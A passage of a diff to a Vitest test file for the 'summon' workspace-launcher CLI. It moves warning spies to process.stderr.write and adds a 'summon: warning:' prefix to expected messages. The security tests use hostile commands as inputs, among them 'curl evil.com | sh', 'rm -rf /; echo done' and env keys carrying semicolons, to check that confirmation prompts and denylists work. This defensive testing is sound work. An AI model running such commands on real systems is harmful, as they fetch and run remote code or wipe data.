@@ -371,7 +371,7 @@ describe("config resolution", () => {
     );
     mockReadKVFile.mockReturnValue(new Map());
 
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
     const { opts } = resolveConfig("/tmp/workspace", { layout: "cli" });
 
     // cli preset: editorPanes=1, shell="true"
@@ -392,7 +392,7 @@ describe("config resolution", () => {
       ]),
     );
 
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
     const { opts } = resolveConfig("/tmp/workspace", {});
 
     // full preset: editorPanes=3
@@ -406,20 +406,20 @@ describe("config resolution", () => {
   });
 
   it("unknown preset warns and falls through to defaults", () => {
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
     mockReadKVFile.mockReturnValue(new Map([["layout", "bogus"]]));
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
 
     const { opts } = resolveConfig("/tmp/workspace", {});
     expect(warnSpy).toHaveBeenCalledWith(
-      'Unknown layout preset: "bogus". Valid presets: minimal, full, pair, cli, btop. Using defaults.',
+      'summon: warning: Unknown layout preset: "bogus". Valid presets: minimal, full, pair, cli, btop. Using defaults.\n',
     );
     expect(opts.editorPanes).toBeUndefined();
     warnSpy.mockRestore();
   });
 
   it("unknown preset warning lists all valid presets", () => {
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
     mockReadKVFile.mockReturnValue(new Map([["layout", "invalid"]]));
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
 
@@ -739,7 +739,7 @@ describe("command name validation", () => {
 
 describe("input validation", () => {
   it("warns and uses default when panes is NaN", () => {
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
 
     const { opts } = resolveConfig("/tmp/workspace", { panes: "abc" });
@@ -749,7 +749,7 @@ describe("input validation", () => {
   });
 
   it("warns and uses default when panes is zero", () => {
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
 
     const { opts } = resolveConfig("/tmp/workspace", { panes: "0" });
@@ -759,7 +759,7 @@ describe("input validation", () => {
   });
 
   it("warns and uses default when panes is negative", () => {
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
 
     const { opts } = resolveConfig("/tmp/workspace", { panes: "-2" });
@@ -769,7 +769,7 @@ describe("input validation", () => {
   });
 
   it("warns and uses default when editorSize is 0", () => {
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
 
     const { opts } = resolveConfig("/tmp/workspace", { "editor-size": "0" });
@@ -779,7 +779,7 @@ describe("input validation", () => {
   });
 
   it("warns and uses default when editorSize is out of range", () => {
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
 
     const { opts } = resolveConfig("/tmp/workspace", { "editor-size": "150" });
@@ -789,7 +789,7 @@ describe("input validation", () => {
   });
 
   it("warns and uses default when editorSize is NaN", () => {
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
 
     const { opts } = resolveConfig("/tmp/workspace", { "editor-size": "big" });
@@ -799,7 +799,7 @@ describe("input validation", () => {
   });
 
   it("accepts valid panes value", () => {
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
 
     const { opts } = resolveConfig("/tmp/workspace", { panes: "5" });
@@ -809,7 +809,7 @@ describe("input validation", () => {
   });
 
   it("accepts valid editorSize value", () => {
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
 
     const { opts } = resolveConfig("/tmp/workspace", { "editor-size": "60" });
@@ -1358,7 +1358,7 @@ describe("shell metacharacter confirmation (#90)", () => {
       cb("y");
     });
 
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     await launch("/tmp/workspace");
 
@@ -1378,7 +1378,7 @@ describe("shell metacharacter confirmation (#90)", () => {
       cb("y");
     });
 
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     await launch("/tmp/workspace");
 
@@ -1398,7 +1398,7 @@ describe("shell metacharacter confirmation (#90)", () => {
       cb("y");
     });
 
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     await launch("/tmp/workspace");
 
@@ -1418,7 +1418,7 @@ describe("shell metacharacter confirmation (#90)", () => {
       cb("y");
     });
 
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     await launch("/tmp/workspace");
 
@@ -1438,7 +1438,7 @@ describe("shell metacharacter confirmation (#90)", () => {
       cb("y");
     });
 
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     await launch("/tmp/workspace");
 
@@ -1458,7 +1458,7 @@ describe("shell metacharacter confirmation (#90)", () => {
       cb("y");
     });
 
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     await launch("/tmp/workspace");
 
@@ -1478,7 +1478,7 @@ describe("shell metacharacter confirmation (#90)", () => {
       cb("y");
     });
 
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     await launch("/tmp/workspace");
 
@@ -1499,8 +1499,8 @@ describe("shell metacharacter confirmation (#90)", () => {
       cb("n");
     });
 
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
-    const stderrSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
+    const stderrSpy = warnSpy;
 
     await expect(launch("/tmp/workspace")).rejects.toThrow();
     const allWrites = stderrSpy.mock.calls.map((c) => String(c[0])).join("\n");
@@ -1524,8 +1524,8 @@ describe("shell metacharacter confirmation (#90)", () => {
     const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
       throw new Error("process.exit");
     });
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
-    const writeSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
+    const writeSpy = warnSpy;
 
     await expect(launch("/tmp/workspace")).rejects.toThrow("process.exit");
     expect(mockExit).toHaveBeenCalledWith(1);
@@ -1545,7 +1545,7 @@ describe("shell metacharacter confirmation (#90)", () => {
       cb("y");
     });
 
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     await launch("/tmp/workspace");
 
@@ -1564,7 +1564,7 @@ describe("shell metacharacter confirmation (#90)", () => {
       cb("yes");
     });
 
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     await launch("/tmp/workspace");
 
@@ -1582,7 +1582,7 @@ describe("shell metacharacter confirmation (#90)", () => {
     const origIsTTY = process.stdin.isTTY;
     Object.defineProperty(process.stdin, "isTTY", { value: false, configurable: true });
 
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     try {
       await expect(launch("/tmp/workspace")).rejects.toThrow();
@@ -1599,7 +1599,7 @@ describe("shell metacharacter confirmation (#90)", () => {
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
 
     const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     await launch("/tmp/workspace", { dryRun: true });
 
@@ -1620,7 +1620,7 @@ describe("shell metacharacter confirmation (#90)", () => {
       cb("y");
     });
 
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     try {
       await launch("/tmp/workspace", { shell: "npm run dev; echo done" });
@@ -1646,7 +1646,7 @@ describe("shell metacharacter confirmation (#90)", () => {
       cb("y");
     });
 
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     try {
       await launch("/tmp/workspace");
@@ -1673,7 +1673,7 @@ describe("shell metacharacter confirmation (#90)", () => {
       cb("y");
     });
 
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     await launch("/tmp/workspace");
 
@@ -1695,7 +1695,7 @@ describe("shell metacharacter confirmation (#90)", () => {
     );
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
 
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     await launch("/tmp/workspace");
 
@@ -1757,12 +1757,15 @@ describe("shell metacharacter confirmation (#90)", () => {
     it("warns and passes null when preset configured but starship not installed", async () => {
       mockIsStarshipInstalled.mockReturnValue(false);
       vi.mocked(listConfig).mockReturnValue(new Map([["starship-preset", "tokyo-night"]]));
-      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
       await launch("/tmp/workspace");
 
       const msgs = warnSpy.mock.calls.map((c) => c[0] as string);
-      expect(msgs.some((m) => m.includes("Starship is not installed"))).toBe(true);
+      expect(msgs.slice(0, 2)).toEqual([
+        'summon: warning: starship-preset is set to "tokyo-night" but Starship is not installed. Skipping.\n',
+        "Install Starship: https://starship.rs\n",
+      ]);
       expect(mockGenerateAppleScript).toHaveBeenCalledWith(
         expect.anything(),
         "/tmp/workspace",
@@ -1781,12 +1784,12 @@ describe("shell metacharacter confirmation (#90)", () => {
         throw new Error("preset generation failed");
       });
       vi.mocked(listConfig).mockReturnValue(new Map([["starship-preset", "bad-preset"]]));
-      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
       await launch("/tmp/workspace");
 
       const msgs = warnSpy.mock.calls.map((c) => c[0] as string);
-      expect(msgs.some((m) => m.includes("Failed to set up Starship preset"))).toBe(true);
+      expect(msgs).toContain('summon: warning: Failed to set up Starship preset "bad-preset": preset generation failed\n');
       expect(mockGenerateAppleScript).toHaveBeenCalledWith(
         expect.anything(),
         "/tmp/workspace",
@@ -1902,17 +1905,36 @@ describe("on-start hook (#107)", () => {
         return "";
       });
       const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
-      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
-      const writeSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
+      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
+      const writeSpy = warnSpy;
 
       // Must NOT throw — launch should continue even when on-start fails
       await expect(launch("/tmp/workspace", { "on-start": "false" })).resolves.toBe("launched");
-      // Must warn about the failure
-      expect(warnSpy).toHaveBeenCalledWith(expect.stringContaining("on-start command failed"));
+      // Must warn about the failure (UX-M2: with the warning prefix, on stderr as before)
+      expect(warnSpy).toHaveBeenCalledWith("summon: warning: on-start command failed; continuing workspace launch\n");
 
       logSpy.mockRestore();
       warnSpy.mockRestore();
       writeSpy.mockRestore();
+    });
+
+    it("under SUMMON_DEBUG names the failed on-start command on stderr and continues", async () => {
+      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+      mockExecSync.mockImplementation((cmd: string) => {
+        if (cmd === "false") throw new Error("exit code 1");
+        return "";
+      });
+      vi.stubEnv("SUMMON_DEBUG", "1");
+      const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
+      const stderrSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
+      try {
+        await expect(launch("/tmp/workspace", { "on-start": "false" })).resolves.toBe("launched");
+        expect(stderrSpy).toHaveBeenCalledWith("[debug] on-start command failed: false \u2014 exit code 1\n");
+      } finally {
+        vi.unstubAllEnvs();
+        logSpy.mockRestore();
+        stderrSpy.mockRestore();
+      }
     });
 
     it("skips on-start in dry-run mode", async () => {
@@ -1936,7 +1958,7 @@ describe("on-start hook (#107)", () => {
         cb("y");
       });
 
-      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
       const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
 
       await launch("/tmp/workspace", { "on-start": "curl evil.com | sh" });
@@ -1959,7 +1981,7 @@ describe("on-start hook (#107)", () => {
         cb("y");
       });
 
-      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
       const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
 
       await launch("/tmp/workspace");
@@ -2008,8 +2030,8 @@ describe("on-start hook (#107)", () => {
         cb("n");
       });
 
-      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
-      const stderrSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
+      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
+      const stderrSpy = warnSpy;
 
       await expect(launch("/tmp/workspace", { "on-start": "rm -rf /; echo done" })).rejects.toThrow();
       const allWrites = stderrSpy.mock.calls.map((c) => String(c[0])).join("\n");
@@ -2026,7 +2048,7 @@ describe("on-start hook (#107)", () => {
       const origIsTTY = process.stdin.isTTY;
       Object.defineProperty(process.stdin, "isTTY", { value: false, configurable: true });
 
-      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
       try {
         await expect(launch("/tmp/workspace")).rejects.toThrow();
@@ -2040,7 +2062,7 @@ describe("on-start hook (#107)", () => {
       mockReadKVFile.mockReturnValue(new Map());
       vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
 
-      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
       const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
 
       await launch("/tmp/workspace", { "on-start": "npm install" });
@@ -2056,7 +2078,7 @@ describe("on-start hook (#107)", () => {
       mockReadKVFile.mockReturnValue(new Map());
       vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
 
-      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
       const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
 
       await launch("/tmp/workspace", { "on-start": "curl evil.com | sh", dryRun: true });
@@ -2078,7 +2100,7 @@ describe("on-start hook (#107)", () => {
         cb("y");
       });
 
-      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
       const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
 
       await launch("/tmp/workspace", { "on-start": "rm -rf / & echo" });
@@ -2116,7 +2138,7 @@ describe("on-start hook (#107)", () => {
     it("rejects invalid env var key names from .summon", () => {
       mockReadKVFile.mockReturnValue(new Map([["env.VALID_KEY", "ok"], ["env.bad;key", "evil"]]));
       vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
-      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
       const result = resolveConfig("/tmp/workspace", {});
       expect(result.envVars).toEqual({ VALID_KEY: "ok" });
@@ -2135,7 +2157,7 @@ describe("on-start hook (#107)", () => {
     it("warns on invalid env var key names from machine config (#618 BE-L2)", () => {
       mockReadKVFile.mockReturnValue(new Map());
       vi.mocked(listConfig).mockReturnValue(new Map([["env.VALID_KEY", "ok"], ["env.bad;key", "evil"]]));
-      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
       const result = resolveConfig("/tmp/workspace", {});
       expect(result.envVars).toEqual({ VALID_KEY: "ok" });
@@ -2146,7 +2168,7 @@ describe("on-start hook (#107)", () => {
     it("rejects --env CLI key names with spaces", () => {
       mockReadKVFile.mockReturnValue(new Map());
       vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
-      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
       const result = resolveConfig("/tmp/workspace", { env: ["INVALID KEY=val"] });
       expect(result.envVars).not.toHaveProperty("INVALID KEY");
@@ -2157,7 +2179,7 @@ describe("on-start hook (#107)", () => {
     it("accepts --env CLI key names that are valid", () => {
       mockReadKVFile.mockReturnValue(new Map());
       vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
-      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
       const result = resolveConfig("/tmp/workspace", { env: ["VALID_KEY=val"] });
       expect(result.envVars).toEqual({ VALID_KEY: "val" });
@@ -2168,7 +2190,7 @@ describe("on-start hook (#107)", () => {
     it("rejects --env CLI key names starting with a digit", () => {
       mockReadKVFile.mockReturnValue(new Map());
       vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
-      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
       const result = resolveConfig("/tmp/workspace", { env: ["123BAD=val"] });
       expect(result.envVars).not.toHaveProperty("123BAD");
@@ -2188,11 +2210,12 @@ describe("on-start hook (#107)", () => {
     ])("drops denylisted command-carrying env var %s from .summon project config (SE-M2)", (envKey) => {
       mockReadKVFile.mockReturnValue(new Map([[`env.${envKey}`, "malicious-cmd"]]));
       vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
-      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
       const result = resolveConfig("/tmp/workspace", {});
       expect(result.envVars).not.toHaveProperty(envKey);
-      expect(warnSpy).toHaveBeenCalledWith(expect.stringContaining(`ignoring denylisted env var key "${envKey}"`));
+      // UX-M2: the one warning prefix; the text after it is unchanged.
+      expect(warnSpy).toHaveBeenCalledWith(`summon: warning: ignoring denylisted env var key "${envKey}" from .summon file.\n`);
       warnSpy.mockRestore();
     });
   });
@@ -2484,13 +2507,18 @@ describe("custom tree layout integration (Phase 4)", () => {
     it("warns and prompts when SUMMON_WORKSPACE is set", async () => {
       process.env.SUMMON_WORKSPACE = "1";
       Object.defineProperty(process.stdin, "isTTY", { value: true, writable: true });
-      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
       // User answers "y" to proceed
       mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("y"));
 
       await launch("/tmp/workspace");
 
-      expect(warnSpy).toHaveBeenCalledWith(expect.stringContaining("existing summon workspace"));
+      // UX-M2: only the first line gains the prefix; the continuation lines and the prompt are unchanged.
+      expect(warnSpy.mock.calls.map((c) => c[0]).slice(0, 3)).toEqual([
+        "summon: warning: You're inside an existing summon workspace.\n",
+        "Launching here will nest splits inside this pane, which can get messy.\n",
+        "Tip: Use --new-window to open in a separate window instead.\n\n",
+      ]);
       expect(mockExecFileSync).toHaveBeenCalled();
       warnSpy.mockRestore();
     });
@@ -2498,7 +2526,7 @@ describe("custom tree layout integration (Phase 4)", () => {
     it("exits when user declines nested launch", async () => {
       process.env.SUMMON_WORKSPACE = "1";
       Object.defineProperty(process.stdin, "isTTY", { value: true, writable: true });
-      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
       // User answers "n"
       mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("n"));
 
@@ -2509,7 +2537,7 @@ describe("custom tree layout integration (Phase 4)", () => {
     it("skips warning when --new-window is set", async () => {
       process.env.SUMMON_WORKSPACE = "1";
       Object.defineProperty(process.stdin, "isTTY", { value: true, writable: true });
-      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
       await launch("/tmp/workspace", { "new-window": "true" });
 
@@ -2521,7 +2549,7 @@ describe("custom tree layout integration (Phase 4)", () => {
       process.env.SUMMON_WORKSPACE = "1";
       Object.defineProperty(process.stdin, "isTTY", { value: true, writable: true });
       mockResolveBackendForLaunch.mockReturnValue({ ok: true, backend: "rex", placement: "inside-rex", server: "unix:///tmp/rex.sock", rexBinary: "/usr/local/bin/rex", notices: [] });
-      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
       mockQuestion.mockClear();
 
       await expect(launch("/tmp/workspace")).resolves.toBe("launched");
@@ -2535,7 +2563,7 @@ describe("custom tree layout integration (Phase 4)", () => {
     it("skips warning when not in a TTY", async () => {
       process.env.SUMMON_WORKSPACE = "1";
       Object.defineProperty(process.stdin, "isTTY", { value: false, writable: true });
-      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
       await launch("/tmp/workspace");
 
@@ -2546,7 +2574,7 @@ describe("custom tree layout integration (Phase 4)", () => {
     it("skips warning in dry-run mode", async () => {
       process.env.SUMMON_WORKSPACE = "1";
       Object.defineProperty(process.stdin, "isTTY", { value: true, writable: true });
-      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
       await launch("/tmp/workspace", { dryRun: true });
 
@@ -2575,7 +2603,7 @@ describe("launch feedback (#144)", () => {
 
   it("does NOT print launch feedback in dry-run mode", async () => {
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
     const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
 
     await launch("/tmp/workspace", { dryRun: true });
@@ -2746,7 +2774,7 @@ describe("on-start metacharacter confirmation (#168)", () => {
       cb("y");
     });
 
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
     const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
 
     await launch("/tmp/workspace");
@@ -2836,7 +2864,7 @@ describe("project config log (#146)", () => {
       return new Map();
     });
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     resolveConfig("/tmp/workspace", {});
 
@@ -2857,7 +2885,7 @@ describe("project config log (#146)", () => {
       return new Map();
     });
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     resolveConfig("/tmp/workspace", {});
 
@@ -2873,7 +2901,7 @@ describe("project config log (#146)", () => {
     Object.defineProperty(process.stdin, "isTTY", { value: true, writable: true });
     mockReadKVFile.mockReturnValue(new Map());
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     resolveConfig("/tmp/workspace", {});
 
@@ -3132,7 +3160,7 @@ describe("W1: tree pane.* commands metacharacter check (#190)", () => {
       cb("y");
     });
 
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     await launch("/tmp/workspace");
 
@@ -3155,7 +3183,7 @@ describe("W1: tree pane.* commands metacharacter check (#190)", () => {
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
     mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));
 
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     await expect(launch("/tmp/workspace")).rejects.toThrow();
 
@@ -3174,7 +3202,7 @@ describe("W1: tree pane.* commands metacharacter check (#190)", () => {
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
     mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));
 
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     await launch("/tmp/workspace");
 
@@ -3195,7 +3223,7 @@ describe("W1: tree pane.* commands metacharacter check (#190)", () => {
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
     mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));
     const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     await launch("/tmp/workspace", { dryRun: true });
 
@@ -3227,7 +3255,7 @@ describe("W1: tree pane.* commands metacharacter check (#190)", () => {
       cb("y");
     });
 
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
     const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
 
     await launch("/tmp/workspace");
@@ -3254,7 +3282,7 @@ describe("W1: tree pane.* commands metacharacter check (#190)", () => {
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
     mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));
     mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("s"));
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     await launch("/tmp/workspace");
 
@@ -3331,7 +3359,7 @@ describe("R19: on-start failure diagnostics (#190)", () => {
       return "";
     });
     const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
     const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
 
     // Launch continues (does not reject) — failure is non-fatal
@@ -3351,10 +3379,10 @@ describe("R19: on-start failure diagnostics (#190)", () => {
 describe("SE-L3/R24: on-start command is not echoed (#190, #557)", () => {
   it("does NOT print on-start command string to stdout or stderr in normal mode", async () => {
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
     const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
     const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
-    const stderrSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
+    const stderrSpy = warnSpy;
 
     await launch("/tmp/workspace", { "on-start": "echo setup" });
 
@@ -3455,20 +3483,20 @@ describe("resolveProjectName — basename sanitization", () => {
   });
 
   it("sanitizes and warns when basename contains spaces", () => {
-    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warn = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
